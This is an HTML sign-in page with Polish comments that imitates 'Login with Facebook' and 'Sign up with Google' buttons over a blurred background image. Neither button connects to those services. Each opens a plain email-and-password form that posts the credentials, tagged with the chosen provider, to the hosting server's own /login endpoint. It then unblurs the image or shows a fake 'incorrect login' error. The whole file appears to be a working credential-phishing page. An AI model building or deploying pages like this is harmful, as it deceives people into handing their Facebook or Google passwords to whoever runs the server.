<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f4f4f4;
            overflow: hidden;
        }

        .background-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
        }

        .background-container img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            filter: blur(10px);
            transition: filter 0.5s ease;
            pointer-events: none;
        }

        .signin-container {
            text-align: center;
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            position: relative;
            z-index: 1;
        }

        .signin-button {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 250px;
            height: 50px;
            margin: 10px 0;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            font-size: 16px;
            color: white;
            font-weight: bold;
            text-decoration: none;
        }

        .facebook-btn {
            background-color: #3b5998;
        }

        .google-btn {
            background-color: #4285f4;
            color: white;
            border: 1px solid #ddd;
            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.2);
        }

        .signin-button img {
            margin-right: 10px;
            width: 24px;
            height: 24px;
        }

        .google-btn img {
            margin-right: 10px;
            margin-left: -10px;
            background-color: white;
            padding: 8px;
            border-radius: 3px;
        }

        .login-panel {
            display: none;
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin-top: 20px;
        }

        .login-panel input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .login-panel button {
            width: 100%;
            padding: 10px;
            border: none;
            background-color: #4285f4;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }

        .login-panel button:hover {
            background-color: #357ae8;
        }

        /* Kółko ładowania */
        .loader {
            display: none;
            border: 8px solid #f3f3f3;
            border-radius: 50%;
            border-top: 8px solid #3498db;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1000;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Styl wiadomości o błędzie */
        .error-message {
            color: red;
            margin-top: 20px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="background-container">
        <img src="https://d-art.ppstatic.pl/kadry/k/r/1/52/55/5cb5b89dcd79c_o_large.jpg" alt="Background Image">
    </div>

    <div class="signin-container" id="signinContainer">
        <h2>Sign In</h2>
        <a href="#" id="facebookBtn" class="signin-button facebook-btn" onclick="showLoginPanel('Facebook')">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
            Login with Facebook
        </a>
        <a href="#" id="googleBtn" class="signin-button google-btn" onclick="showLoginPanel('Google')">
            <img src="https://user-images.githubusercontent.com/1770056/58111071-c2941c80-7bbe-11e9-8cac-1c3202dffb26.png" alt="Google Logo">
            Sign up with Google
        </a>

        <!-- Panel logowania -->
        <div id="loginPanel" class="login-panel">
            <h3 id="loginTitle">Login</h3>
            <form id="loginForm" method="POST">
                <input type="text" placeholder="Email or Username" id="email" name="email" required>
                <input type="password" placeholder="Password" id="password" name="password" required>
                <input type="hidden" id="provider" name="provider">
                <button type="submit">Login</button>
            </form>
            <p id="errorMessage" class="error-message">Niepoprawne dane logowanie. Spróbuj ponownie!</p>
        </div>
    </div>

    <!-- Kółko ładowania -->
    <div class="loader" id="loadingSpinner"></div>

    <script>
        function showLoginPanel(platform) {
            const loginPanel = document.getElementById('loginPanel');
            const loginTitle = document.getElementById('loginTitle');
            const providerInput = document.getElementById('provider');
            const facebookBtn = document.getElementById('facebookBtn');
            const googleBtn = document.getElementById('googleBtn');

            // Ukryj przyciski
            facebookBtn.style.display = 'none';
            googleBtn.style.display = 'none';

            // Pokaż panel logowania
            loginPanel.style.display = 'block';
            loginTitle.textContent = `Login with ${platform}`;
            providerInput.value = platform;
        }

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // Ukryj wiadomość o błędzie, jeśli była wcześniej wyświetlona
            document.getElementById('errorMessage').style.display = 'none';

            // Pokaż kółko ładowania
            document.getElementById('loadingSpinner').style.display = 'block';

            const formData = new FormData(event.target);
            fetch('/login', {
                method: 'POST',
                body: formData
            }).then(response => {
                return response.json();
            }).then(data => {
                // Poczekaj 3 sekundy przed ukryciem kółka ładowania
                setTimeout(() => {
                    document.getElementById('loadingSpinner').style.display = 'none';

                    if (data.status === 'success') {
                        // Usuń filtr rozmycia z tła i ukryj panel logowania
                        document.querySelector('.background-container img').style.filter = 'none';
                        document.querySelector('.background-container img').style.pointerEvents = 'auto';
                        document.getElementById('signinContainer').style.display = 'none';
                    } else {
                        // Pokaż wiadomość o błędzie
                        document.getElementById('errorMessage').style.display = 'block';
                    }
                }, 3000); // Opóźnienie 3 sekundy
            });
        });
    </script>
</body>
</html>
